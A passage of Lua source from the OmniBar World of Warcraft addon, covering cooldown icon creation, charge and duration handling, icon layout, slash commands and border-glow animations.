	icon.spellID = spellID
	icon.added = now

	if icon.charges and cooldowns[originalSpellID].charges and icon:IsVisible() then
		local start, duration = GetCooldownTimes(icon.cooldown)
		if icon.cooldown.finish and icon.cooldown.finish - GetTime() > 1 then
			-- add a charge
			local charges = icon.charges + 1
			icon.charges = charges
			icon.Count:SetText(charges)
			if not self.settings.noGlow then
				animate(icon);
			end
			return icon
		end
	elseif cooldowns[originalSpellID].charges then
		icon.charges = 1
		icon.Count:SetText("1")
	else
		icon.charges = nil
		--icon.Count:SetText(nil) dont touch I think
	end
	if cooldowns[originalSpellID].duration then
		if type(cooldowns[originalSpellID].duration) == "table" then
			if icon.specID and cooldowns[originalSpellID].duration[icon.specID] then
				icon.duration = cooldowns[originalSpellID].duration[icon.specID]
			else
				icon.duration = cooldowns[originalSpellID].duration.default
			end
		else
			icon.duration = cooldowns[originalSpellID].duration
		end
	else -- child doesn't have a custom duration, use parent
		if type(cooldowns[spellID].duration) == "table" then
			if icon.specID and cooldowns[spellID].duration[icon.specID] then
				icon.duration = cooldowns[spellID].duration[icon.specID]
			else
				icon.duration = cooldowns[spellID].duration.default
			end
		else
			icon.duration = cooldowns[spellID].duration
		end
	end

	-- We don't want duration to be too long if we're just testing
	if test then icon.duration = 5 end


	icon:Show()

	if not init then
		OmniBar_StartCooldown(self, icon, now)
		if not self.settings.noGlow then
			animate(icon);
		end
	end

	return icon
end

function OmniBar_UpdateIcons(self)
	for i = 1, self.numIcons do
		-- Set show text
		--self.icons[i].cooldown:SetHideCountdownNumbers(self.settings.noCooldownCount and true or false)
		self.icons[i].cooldown.noCooldownCount = self.settings.noCooldownCount and true

		-- Set swipe alpha
		--self.icons[i].cooldown:SetSwipeColor(0, 0, 0, self.settings.swipeAlpha or 0.65)
		-- Set border
		if self.settings.border then
			self.icons[i].icon:SetTexCoord(0, 0, 0, 1, 1, 0, 1, 1)
		else
			self.icons[i].icon:SetTexCoord(0.07, 0.9, 0.07, 0.9)
		end

		-- Set dim
		self.icons[i]:SetAlpha(self.settings.unusedAlpha and self.settings.unusedAlpha or 1)

		-- Masque
		if self.icons[i].MasqueGroup then self.icons[i].MasqueGroup:ReSkin() end

	end
end

function OmniBar_Test(self)
	self.disabled = nil

	OmniBar_RefreshIcons(self)
	for k,v in pairs(cooldowns) do
		OmniBar_AddIcon(self, k, nil, nil, nil, true)
	end
end

local function ExtractDigits(str)
	if not str then return 0 end
	if type(str) == "number" then return str end
	local num = str:gsub("%D", "")
	return tonumber(num) or 0
end

function OmniBar_Position(self)

	local numActive = #self.active
	if numActive == 0 then
		-- Show the anchor if needed
		OmniBar_ShowAnchor(self)
		return
	end

	-- Keep cooldowns together by class
	if self.settings.showUnused then
		table.sort(self.active, function(a, b)
			local x, y = ExtractDigits(a.sourceGUID), ExtractDigits(b.sourceGUID)
			if a.class == b.class then
				if x < y then return true end
				if x == y then return a.spellID < b.spellID end
			end
			return order[a.class] < order[b.class]
		end)
	else
		-- if we aren't showing unused, just sort by added time
		table.sort(self.active, function(a, b) return a.added == b.added and a.spellID < b.spellID or a.added < b.added end)
	end

	local count, rows = 0, 1
	local grow = self.settings.growUpward and 1 or -1
	local padding = self.settings.padding and self.settings.padding or 0
	for i = 1, numActive do
		if self.settings.locked then
			self.active[i]:EnableMouse(false)
		else
			self.active[i]:EnableMouse(true)
		end
		self.active[i]:ClearAllPoints()
		local columns = self.settings.columns and self.settings.columns > 0 and self.settings.columns < numActive and
			self.settings.columns or numActive
		if i > 1 then
			count = count + 1
			if count >= columns then
				self.active[i]:SetPoint("CENTER", OmniBarIcons, "CENTER", (-BASE_ICON_SIZE-padding)*(columns-1)/2, (BASE_ICON_SIZE+padding)*rows*grow)
				count = 0
				rows = rows + 1
			else
				self.active[i]:SetPoint("TOPLEFT", self.active[i-1], "TOPRIGHT", padding, 0)
			end
			
		else
			self.active[i]:SetPoint("CENTER", OmniBarIcons, "CENTER", (-BASE_ICON_SIZE-padding)*(columns-1)/2, 0)
		end
	end
	
	OmniBar_ShowAnchor(self)
end


SLASH_OmniBar1 = "/ob"
SLASH_OmniBar2 = "/omnibar"
SlashCmdList.OmniBar = function(msg)
	local cmd, arg1 = string.split(" ", string.lower(msg))

	if cmd == "lock" or cmd == "unlock" then
		OmniBar.settings.locked = cmd == "lock" and true or false
		OmniBar_Position(OmniBar)
		if OmniBarOptionsPanelLock then OmniBarOptionsPanelLock:SetChecked(OmniBar.settings.locked) end

	elseif cmd == "reset" then
		StaticPopup_Show("OMNIBAR_CONFIRM_RESET")

	elseif cmd == "test" then
		OmniBar_Test(OmniBar)

	else
		if LoadAddOn("OmniBar_Options") then
			InterfaceOptionsFrame_OpenToCategory(addonName)
			InterfaceOptionsFrame_OpenToCategory(addonName)
		end

	end

end

local animationsCount = 5;
local animations = {};
local borderFrame, borderT, flashFrame, flashT, animationGroup, animationGroupTwo, alphaF1,alphaF2, alpha1, alpha2, alpha3, alpha4, scale1;
for i = 1, animationsCount do

	--Border Frame
	borderframe = CreateFrame("Frame");
  
	--Border Texture
	borderT = borderframe:CreateTexture(nil, "OVERLAY")
	borderT:SetTexture("Interface\\AddOns\\OmniBar\\UI-ActionButton-Border.blp");
	borderT:SetAlpha(0);
	borderT:SetAllPoints();
	borderT:SetBlendMode("ADD");
	borderT:SetVertexColor(0.0,0.4392156862745098,0.8666666666666667)
  
	--Flash Frame
    flashFrame = CreateFrame("Frame");
	
	--Flash Texture
	flashT = flashFrame:CreateTexture(nil, "OVERLAY")
	flashT:SetTexture("Interface\\AddOns\\OmniBar\\Bags.blp");
	flashT:SetHeight(95);
	flashT:SetWidth(95);
	flashT:SetAlpha(0);
	flashT:SetAllPoints();
	flashT:SetBlendMode("ADD");
	flashT:SetTexCoord(0.35546875,0.00390625,0.35546875,0.0078125)

	--{"bags-glow-purple", [[Interface\ContainerFrame\Bags.BLP]], 39, 39, 0.5234375, 0.67578125, 0.0078125, 0.3125, false, false},
	--{"bags-glow-blue", [[Interface\ContainerFrame\Bags.BLP]], 39, 39, 0.36328125, 0.515625, 0.328125, 0.6328125, false, false},
	--{"bags-glow-orange", [[Interface\ContainerFrame\Bags.BLP]], 39, 39, 0.36328125, 0.515625, 0.6484375, 0.953125, false, false},
	--{"bags-glow-green", [[Interface\ContainerFrame\Bags.BLP]], 39, 39, 0.36328125, 0.515625, 0.0078125, 0.3125, false, false},
	--{"bags-glow-heirloom", [[Interface\ContainerFrame\Bags.BLP]], 39, 39, 0.68359375, 0.8359375, 0.0078125, 0.3125, false, false},
	--{"bags-glow-white", [[Interface\ContainerFrame\Bags.BLP]], 39, 39, 0.84375, 0.99609375, 0.0078125, 0.3125, false, false},
	--{"bags-glow-flash", [[Interface\ContainerFrame\Bags.BLP]], 90, 90, 0.00390625, 0.35546875, 0.0078125, 0.7109375, false, false},
  
	--FLASH
	animationGroupTwo = flashT:CreateAnimationGroup();
  
	scaleF = animationGroupTwo:CreateAnimation("Scale");
	scaleF:SetScale(2, 2);
	scaleF:SetDuration(0);
	scaleF:SetOrder(1);

	alphaF1 = animationGroupTwo:CreateAnimation("Alpha");
	alphaF1:SetChange(1);
	alphaF1:SetDuration(0);
	alphaF1:SetOrder(1);
	alphaF1:SetSmoothing("OUT")

	alphaF2 = animationGroupTwo:CreateAnimation("Alpha");
	alphaF2:SetChange(-1);
	alphaF2:SetDuration(1);
	alphaF2:SetOrder(2);
	alphaF2:SetSmoothing("OUT")

	--BLUE BORDER
	animationGroup = borderT:CreateAnimationGroup();

	scale1 = animationGroup:CreateAnimation("Scale");
	scale1:SetScale(2, 2);
	scale1:SetDuration(0);
	scale1:SetOrder(1);

	alpha1 = animationGroup:CreateAnimation("Alpha");
	alpha1:SetChange(1);
	alpha1:SetDuration(1);
	alpha1:SetOrder(1);
	alpha1:SetSmoothing("OUT")

	alpha2 = animationGroup:CreateAnimation("Alpha");
	alpha2:SetChange(-0.6);
	alpha2:SetDuration(1);
	alpha2:SetOrder(2);

	alpha3 = animationGroup:CreateAnimation("Alpha");
	alpha3:SetChange(0.6);
	alpha3:SetDuration(1);
	alpha3:SetOrder(3);

	alpha4 = animationGroup:CreateAnimation("Alpha");
	alpha4:SetChange(-1);
	alpha4:SetDuration(1);
	alpha4:SetOrder(4);
  
	animations[i] = {borderFrame = borderframe, flashFrame = flashFrame, animationGroup = animationGroup, animationGroupTwo = animationGroupTwo};
end

local animationNum = 1;
function animate(button)

  if (not button:IsVisible()) then
    return true;
  end

  local animation = animations[animationNum];
  local borderFrame = animation.borderFrame;
  local animationGroup = animation.animationGroup;

  borderFrame:SetFrameStrata(button:GetFrameStrata());
  borderFrame:SetFrameLevel(button:GetFrameLevel() + 10);
  borderFrame:SetAllPoints(button);

  animationGroup:Stop();
  animationGroup:Play();
  
  local flashFrame = animation.flashFrame;
  local animationGroupTwo = animation.animationGroupTwo;

  flashFrame:SetFrameStrata(button:GetFrameStrata());
  flashFrame:SetFrameLevel(button:GetFrameLevel() + 10);
  flashFrame:SetAllPoints(button);

  animationGroupTwo:Stop();
  animationGroupTwo:Play();

  animationNum = (animationNum % animationsCount) + 1;

  return true;
end

